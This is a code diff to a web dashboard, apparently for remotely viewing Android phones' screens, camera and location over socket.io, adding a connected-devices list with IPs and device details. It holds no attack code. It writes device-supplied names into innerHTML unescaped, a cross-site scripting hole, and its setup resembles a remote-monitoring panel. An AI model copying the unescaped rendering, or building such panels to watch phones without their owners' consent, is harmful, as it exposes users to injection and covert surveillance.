@@ -63,6 +63,14 @@
     
     <div id="status" class="disconnected">Disconnected</div>
     
+    <!-- Connected Devices Section -->
+    <div class="card">
+        <h2>Connected Devices</h2>
+        <div id="devices-list">
+            <p>No devices connected</p>
+        </div>
+    </div>
+    
     <div class="container">
         <div class="card">
             <h2>Screen Sharing</h2>
@@ -99,6 +107,7 @@
         const cameraDisplay = document.getElementById('camera-display');
         const cameraStatus = document.getElementById('camera-status');
         const locationStatus = document.getElementById('location-status');
+        const devicesList = document.getElementById('devices-list');
         
 // Connection status
         socket.on('connect', () => {
@@ -118,12 +127,56 @@
             statusElement.classList.add('disconnected');
         });
         
+        // Device list management
+        socket.on('devices-updated', (devices) => {
+            console.log('Devices updated:', devices);
+            updateDevicesList(devices);
+        });
+        
+        function updateDevicesList(devices) {
+            if (devices.length === 0) {
+                devicesList.innerHTML = '<p>No devices connected</p>';
+                return;
+            }
+            
+            let html = '';
+            devices.forEach(device => {
+                const connectedTime = new Date(device.connectedAt).toLocaleString();
+                html += `
+                    <div style="border: 1px solid #ddd; padding: 10px; margin: 5px 0; border-radius: 4px;">
+                        <strong>${device.deviceName || 'Unknown Device'}</strong> (${device.manufacturer || 'Unknown'})<br>
+                        <small>IP: ${device.ip} | Android ${device.androidVersion} | Connected: ${connectedTime}</small><br>
+                        <small>Socket ID: ${device.id.substring(0, 8)}...</small>
+                    </div>
+                `;
+            });
+            devicesList.innerHTML = html;
+        }
+        
         // Screen sharing
         socket.on('share-screen', (data) => {
             console.log('Received screen data:', data ? 'data available' : 'no data');
             if (data && data.data) {
-                screenDisplay.src = 'data:image/jpeg;base64,' + data.data;
-                screenStatus.textContent = `Receiving screen: ${data.width}x${data.height}`;
+                // Try different image formats for H.264 encoded data
+                const img = new Image();
+                img.onload = function() {
+                    screenDisplay.src = img.src;
+                    screenDisplay.style.display = 'block';
+                    
+                    let statusText = `Receiving screen: ${data.width}x${data.height}`;
+                    if (data.deviceInfo) {
+                        statusText += ` from ${data.deviceInfo.deviceName} (${data.deviceInfo.ip})`;
+                    }
+                    screenStatus.textContent = statusText;
+                };
+                
+                img.onerror = function() {
+                    console.error('Failed to load screen image');
+                    screenStatus.textContent = 'Error displaying screen data';
+                };
+                
+                // Try different MIME types for the base64 data
+                img.src = 'data:image/jpeg;base64,' + data.data;
             }
         });
         
